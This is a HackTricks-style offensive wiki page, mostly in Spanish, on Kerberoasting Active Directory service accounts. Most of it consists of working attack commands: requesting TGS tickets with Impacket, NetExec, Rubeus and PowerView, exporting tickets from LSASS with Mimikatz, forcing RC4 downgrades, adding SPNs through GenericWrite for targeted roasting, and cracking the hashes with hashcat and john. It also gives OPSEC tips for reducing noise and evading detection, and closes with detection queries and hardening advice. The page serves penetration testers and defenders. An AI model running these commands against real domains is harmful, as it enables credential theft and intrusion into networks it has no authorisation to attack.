# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se centra en la adquisición de tickets TGS, específicamente en aquellos relacionados con servicios que funcionan bajo cuentas de usuario en Active Directory (AD), excluyendo cuentas de equipo. El cifrado de estos tickets utiliza claves que se originan en las contraseñas de usuario, lo que permite cracking de credenciales de forma offline. El uso de una cuenta de usuario como servicio se indica con una propiedad ServicePrincipalName (SPN) no vacía.

Cualquier usuario de dominio autenticado puede solicitar tickets TGS, por lo que no se necesitan privilegios especiales.

### Key Points

- Apunta a tickets TGS para servicios que se ejecutan bajo cuentas de usuario (es decir, cuentas con SPN establecido; no cuentas de equipo).
- Los tickets están cifrados con una clave derivada de la contraseña de la cuenta de servicio y pueden ser crackeados offline.
- No se requieren privilegios elevados; cualquier cuenta autenticada puede solicitar tickets TGS.

> [!WARNING]
> La mayoría de las herramientas públicas prefieren solicitar tickets de servicio RC4-HMAC (etype 23) porque son más rápidos de crackear que AES. Los hashes TGS RC4 comienzan con `$krb5tgs$23$*`, AES128 con `$krb5tgs$17$*`, y AES256 con `$krb5tgs$18$*`. Sin embargo, muchos entornos se están moviendo a AES-only. No asumas que solo RC4 es relevante.
> Además, evita el “spray-and-pray” roasting. El kerberoast por defecto de Rubeus puede consultar y solicitar tickets para todos los SPN y es ruidoso. Enumera y apunta a principals interesantes primero.

### Service account secrets & Kerberos crypto cost

Muchos servicios todavía se ejecutan bajo cuentas de usuario con contraseñas gestionadas manualmente. El KDC cifra los tickets de servicio con claves derivadas de esas contraseñas y entrega el texto cifrado a cualquier principal autenticado, por lo que kerberoasting permite intentos offline ilimitados sin bloqueos ni telemetría del DC. El modo de cifrado determina el presupuesto de cracking:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 con 4.096 iteraciones y una sal por-principal generada a partir del dominio + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | La sal impide tablas arcoíris pero aún permite crackear rápidamente contraseñas cortas. |
| RC4 + NT hash | MD4 único de la contraseña (NT hash sin sal); Kerberos solo mezcla un confounder de 8 bytes por ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **mil millones** guesses/s | ~1000× más rápido que AES; los atacantes fuerzan RC4 siempre que `msDS-SupportedEncryptionTypes` lo permita. |

*Benchmarks de Chick3nman como se detalla en [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

El confounder de RC4 solo aleatoriza el keystream; no añade trabajo por intento. A menos que las cuentas de servicio dependan de secretos aleatorios (gMSA/dMSA, machine accounts, o cadenas gestionadas por vault), la velocidad de compromiso depende únicamente del presupuesto GPU. Forzar etypes AES-only elimina la degradación que permite mil millones de conjeturas por segundo, pero las contraseñas humanas débiles aún caen frente a PBKDF2.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Herramientas multifunción que incluyen comprobaciones de kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerar usuarios kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Técnica 1: Solicitar TGS y volcar desde la memoria
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Técnica 2: Herramientas automáticas
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Una solicitud TGS genera Windows Security Event 4769 (Se solicitó un ticket de servicio de Kerberos).

### OPSEC y entornos solo AES

- Solicitar RC4 a propósito para cuentas sin AES:
- Rubeus: `/rc4opsec` usa tgtdeleg para enumerar cuentas sin AES y solicita tickets de servicio RC4.
- Rubeus: `/tgtdeleg` con kerberoast también provoca solicitudes RC4 cuando es posible.
- Roast cuentas únicamente con AES en lugar de fallar silenciosamente:
- Rubeus: `/aes` enumera cuentas con AES habilitado y solicita tickets de servicio AES (etype 17/18).
- Si ya posees un TGT (PTT o de un .kirbi), puedes usar `/ticket:<blob|path>` con `/spn:<SPN>` o `/spns:<file>` y omitir LDAP.
- Focalización, throttling y menos ruido:
- Usa `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` y `/jitter:<1-100>`.
- Filtra por contraseñas probablemente débiles usando `/pwdsetbefore:<MM-dd-yyyy>` (contraseñas más antiguas) o apunta a OUs privilegiadas con `/ou:<DN>`.

Ejemplos (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistencia / Abuso

Si controlas o puedes modificar una cuenta, puedes hacerla kerberoastable agregando un SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Degradar una cuenta para habilitar RC4 y facilitar el cracking (requiere write privileges en el objeto objetivo):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Kerberoast dirigido vía GenericWrite/GenericAll sobre un usuario (SPN temporal)

Cuando BloodHound muestra que controlas un objeto de usuario (p. ej., GenericWrite/GenericAll), puedes realizar de forma fiable un “targeted-roast” a ese usuario específico incluso si actualmente no tiene SPNs:

- Añade un SPN temporal al usuario controlado para que sea roastable.
- Solicita un TGS-REP cifrado con RC4 (etype 23) para ese SPN para favorecer el cracking.
- Crack the `$krb5tgs$23$...` hash with hashcat.
- Limpia el SPN para reducir el footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
One-liner en Linux (targetedKerberoast.py automatiza añadir SPN -> solicitar TGS (etype 23) -> eliminar SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Descifra la salida con hashcat autodetect (mode 13100 para `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: adding/removing SPNs produces directory changes (Event ID 5136/4738 on the target user) and the TGS request generates Event ID 4769. Consider throttling and prompt cleanup.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

En septiembre de 2022, Charlie Clark demostró que si un principal no requiere pre-authentication, es posible obtener un service ticket mediante un KRB_AS_REQ manipulado alterando el sname en el cuerpo de la solicitud, obteniendo efectivamente un service ticket en lugar de un TGT. Esto refleja AS-REP roasting y no requiere credenciales de dominio válidas.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Debe proporcionar una lista de usuarios porque sin credenciales válidas no puede consultar LDAP con esta técnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Relacionado

Si estás apuntando a usuarios AS-REP roastable, consulta también:

{{#ref}}
asreproast.md
{{#endref}}

### Detección

Kerberoasting puede ser sigiloso. Busca Event ID 4769 desde los DCs y aplica filtros para reducir ruido:

- Excluir el nombre de servicio `krbtgt` y los nombres de servicio que terminan con `$` (cuentas de equipo).
- Excluir solicitudes desde cuentas de máquina (`*$$@*`).
- Solo solicitudes exitosas (Código de error `0x0`).
- Rastrear tipos de cifrado: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). No alertes solo por `0x17`.

Ejemplo de triage en PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ideas adicionales:

- Establecer una línea base del uso normal de SPN por host/usuario; alertar sobre ráfagas grandes de solicitudes de SPN distintas desde un único principal.
- Marcar el uso inusual de RC4 en dominios reforzados con AES.

### Mitigación / Endurecimiento

- Usar gMSA/dMSA o cuentas de máquina para servicios. Las cuentas administradas tienen contraseñas aleatorias de más de 120 caracteres y rotan automáticamente, lo que hace que el crackeo offline sea impráctico.
- Forzar AES en cuentas de servicio configurando `msDS-SupportedEncryptionTypes` a solo AES (decimal 24 / hex 0x18) y luego rotar la contraseña para que se deriven claves AES.
- Donde sea posible, deshabilitar RC4 en tu entorno y monitorizar intentos de uso de RC4. En los DCs puedes usar el valor de registro `DefaultDomainSupportedEncTypes` para orientar los valores predeterminados de cuentas sin `msDS-SupportedEncryptionTypes` configurado. Probar exhaustivamente.
- Eliminar SPNs innecesarios de cuentas de usuario.
- Usar contraseñas largas y aleatorias para cuentas de servicio (25+ caracteres) si las cuentas administradas no son factibles; prohibir contraseñas comunes y auditar regularmente.

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
